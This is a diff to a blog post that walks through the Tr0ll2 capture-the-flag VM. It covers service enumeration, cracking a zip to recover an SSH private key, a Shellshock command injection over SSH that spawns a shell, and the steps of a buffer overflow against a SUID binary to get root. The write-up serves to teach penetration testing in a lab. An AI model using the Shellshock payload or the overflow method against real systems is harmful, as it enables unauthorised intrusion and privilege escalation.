@@ -39,9 +39,9 @@ Difficulty is beginner++ to intermediate.
 </i></p>
 
 
-##Enumeration 
+##Enumeration
 
-Enumeration process started. 
+Enumeration process started.
 
 ![Star Trek Enumeration](/img/kirk-enumeration.gif)
 
@@ -58,7 +58,7 @@ Enumeration process started.
           <span class="output"><br></span>
           <span class="output">Host is up (0.0026s latency).<br></span>
           <span class="output">Not shown: 65532 closed ports<br></span>
-          <span class="output">PORT   STATE SERVICE VERSION <br></span> 
+          <span class="output">PORT   STATE SERVICE VERSION <br></span>
           <span class="output">21/tcp open  ftp     vsftpd 2.0.8 or later<br></span>
           <span class="output">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br></span>
           <span class="output">| ssh-hostkey: <br></span>
@@ -130,7 +130,7 @@ Enumeration process started.
         </tr>
       </tbody>
 </table>
-</div> 
+</div>
 
 ###SSH Enumeration
 
@@ -138,7 +138,7 @@ Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I a
 
 ###FTP Enumeration
 
-I tired the same credentials against ftp and discovered a file called "noob" in the ftp root. 
+I tired the same credentials against ftp and discovered a file called "noob" in the ftp root.
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -151,8 +151,8 @@ I tired the same credentials against ftp and discovered a file called "noob" in 
           <span class="output">Connected to 172.31.31.6<br></span>
           <span class="output">220 Welcome to Tr0ll FTP... Only noobs stay for a while...<br></span>
           <span class="output">Name (172.31.31.6:root): Tr0ll<br></span>
-          <span class="output">331 Please specify the password.<br></span> 
-          <span class="output">Password:<br></span> 
+          <span class="output">331 Please specify the password.<br></span>
+          <span class="output">Password:<br></span>
           <span class="output">230 Login successful.<br></span>
           <span class="output">Remote system type is UNIX.<br></span>
           <span class="output">Using binary mode to transfer files.<br></span>
@@ -170,17 +170,17 @@ I tired the same credentials against ftp and discovered a file called "noob" in 
     </div>
 </section>
 
-Attempting to extract lmao.zip failed, prompting for a <code>noob</code> password. 
+Attempting to extract lmao.zip failed, prompting for a <code>noob</code> password.
 
-Onto the next service then... 
+Onto the next service then...
 
-###HTTP Enumeration 
+###HTTP Enumeration
 
 ![Star Trek HTTP Enumeration](/img/star-trek-enumeration.gif)
 
-Web browser showed: 
+Web browser showed:
 
-![tr0ll me again](/img/blog/tr0ll-me-again.PNG) 
+![tr0ll me again](/img/blog/tr0ll-me-again.PNG)
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -194,7 +194,7 @@ Web browser showed:
           <span class="output">Nmap scan report for 172.31.31.6<br></span>
           <span class="output">Host is up (0.00046s latency).<br></span>
           <span class="output">PORT   STATE SERVICE<br></span>
-          <span class="output">80/tcp open  http<br></span> 
+          <span class="output">80/tcp open  http<br></span>
           <span class="output">| http-enum:<br></span>
           <span class="output">|   /robots.txt: Robots file<br></span>
           <span class="output"><br></span>
@@ -204,7 +204,7 @@ Web browser showed:
     </div>
 </section>
 
-Entering /robots.txt url in the browser rendered: 
+Entering /robots.txt url in the browser rendered:
 
 {% highlight bash %}
 
@@ -235,7 +235,7 @@ Disallow:
 {% endhighlight %}
 
 
-The slash was stripped off with some sed <code>sed 's./..g' robots.txt</code> dirb was then used to check the following urls. 
+The slash was stripped off with some sed <code>sed 's./..g' robots.txt</code> dirb was then used to check the following urls.
 
 {% highlight bash %}
 -----------------
@@ -256,7 +256,7 @@ GENERATED WORDS: 21
 + http://172.31.31.6//keep_trying (CODE:301|SIZE:316)                                                                        
 + http://172.31.31.6//dont_bother (CODE:301|SIZE:316)                                                                        
 + http://172.31.31.6//ok_this_is_it (CODE:301|SIZE:318)                                                                      
-                                                                                                                             
+
 -----------------
 DOWNLOADED: 21 - FOUND: 4
 {% endhighlight %}
@@ -265,23 +265,23 @@ They all rendered the same image (301'd).
 
 ![tr0ll cats](/img/blog/tr0ll-cats.PNG)
 
-Nothing exciting was in the page source: 
+Nothing exciting was in the page source:
 
 {% highlight bash %}
 What did you really think to find here? Try Harder
 {% endhighlight %}
 
-<code>cat_the_troll.jpg</code> was downloaded from all the above locations from the target and examined. 
+<code>cat_the_troll.jpg</code> was downloaded from all the above locations from the target and examined.
 
-ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry). 
+ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry).
 
 {% highlight bash %}
 Look Deep within y0ur_self for the answer
 {% endhighlight %}
 
-I tired this against the previously downloaded <code>lmao.zip</code> file, no luck. I tried <code>y0ur_self</code> as web path like on tr0ll:1 
+I tired this against the previously downloaded <code>lmao.zip</code> file, no luck. I tried <code>y0ur_self</code> as web path like on tr0ll:1
 
-Success, the web dir contained a text file <code>http://172.31.31.6/y0ur_self/answer.txt</code> scrolling though from the browser it looked like the file was base64 encoded. 
+Success, the web dir contained a text file <code>http://172.31.31.6/y0ur_self/answer.txt</code> scrolling though from the browser it looked like the file was base64 encoded.
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -312,7 +312,7 @@ Decoding the file revealed it was massive, the following was used to decode and 
     </div>
 </section>
 
-The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tried this against <code>lmao.zip</code> 
+The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tried this against <code>lmao.zip</code>
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -329,11 +329,11 @@ The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tri
     </div>
 </section>
 
-![Data Yes Fist](\img\data-yes-fist.gif)
+![Data Yes Fist](/img/data-yes-fist.gif)
 
 Yes!
 
-The contents of <code>noob</code> 
+The contents of <code>noob</code>
 
 {% highlight bash %}
 -----BEGIN RSA PRIVATE KEY-----
@@ -367,13 +367,13 @@ zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
 
 ### SSH Shellshock
 
-Attempting to login using the discovered key failed, with a messaging saying <code>TRY HARDER LOL!</code>. 
+Attempting to login using the discovered key failed, with a messaging saying <code>TRY HARDER LOL!</code>.
 
-![Vulcan Rage Quit](\img\vulcan-ragequit.gif)
+![Vulcan Rage Quit](/img/vulcan-ragequit.gif)
 
-I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message. 
+I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message.
 
-I googled some shellshock options and managed to spawn a shell with: 
+I googled some shellshock options and managed to spawn a shell with:
 
 <code>ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'</code>
 
@@ -395,7 +395,7 @@ I googled some shellshock options and managed to spawn a shell with:
 
 ##Local Enumeration
 
-Transfered my local enumeration script to the target, disclosing the following odd sticky bit files: 
+Transfered my local enumeration script to the target, disclosing the following odd sticky bit files:
 
 {% highlight bash %}
 #########################################
@@ -409,9 +409,9 @@ drwsr-xr-x 2 root root 4096 Oct  5 21:18 /nothing_to_see_here/choose_wisely/door
 drwsr-xr-x 2 root root 4096 Oct  4 22:19 /nothing_to_see_here/choose_wisely/door1
 {% endhighlight %}
 
-Each of the door directories contained a file called r00t, du -sh * in the parent dir <code>choose_wisely</code> showed one of the files was larger - I started there. 
+Each of the door directories contained a file called r00t, du -sh * in the parent dir <code>choose_wisely</code> showed one of the files was larger - I started there.
 
-<code>od -S 1 r00t</code> was used against each of the files, the larget file contained: 
+<code>od -S 1 r00t</code> was used against each of the files, the larget file contained:
 
 {% highlight bash %}
 0017545 bof.c
@@ -436,13 +436,13 @@ Each of the door directories contained a file called r00t, du -sh * in the paren
 0020203 __libc_csu_init
 {% endhighlight %}
 
-bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it's more tr0ling). 
+bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it's more tr0ling).
 
 ##Exploit Development
 
-###Fuzzing 
+###Fuzzing
 
-I started by fuzzing with 300 A's: 
+I started by fuzzing with 300 A's:
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -458,20 +458,20 @@ I started by fuzzing with 300 A's:
     </div>
 </section>
 
-Bangin' then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 <code>Illegal instruction</code>. 
+Bangin' then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 <code>Illegal instruction</code>.
 
-Using gdb I located the address of ESP. 
+Using gdb I located the address of ESP.
 
 {% highlight bash %}
 (gdb) i r esp
 esp            0xbffffb80 0xbffffb80
 {% endhighlight %}
 
-Padded with some NOPs - for a reliable landing. 
+Padded with some NOPs - for a reliable landing.
 
-![Worf jump](\img\warf-jump.gif)
+![Worf jump](/img/warf-jump.gif)
 
-Overwrote EIP with the location of ESP and tagged some shellcode on the end to exectute a shell. 
+Overwrote EIP with the location of ESP and tagged some shellcode on the end to exectute a shell.
 
 ###Final Exploit
 
@@ -481,7 +481,7 @@ Overwrote EIP with the location of ESP and tagged some shellcode on the end to e
 
 Note: gdb drops privileges on SUID, in order to spawn the new shell with SUID you need to execute the exploit outside of gdb, or the shell will spawn as the unprivileged user.
 
-The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the vulnerable binary. 
+The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the vulnerable binary.
 
 <section class="shellbox">
     <div class="unit golden-large code">
@@ -526,10 +526,10 @@ The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the
 </section>
 
 
-##Root dance 
+##Root dance
 
-![Root Dance](\img\girl-dancing-excited.gif)
+![Root Dance](/img/girl-dancing-excited.gif)
 
-##Thanks 
+##Thanks
 
 Thanks to [@maleus21](https://twitter.com/@maleus21) for creating this VM challenege.
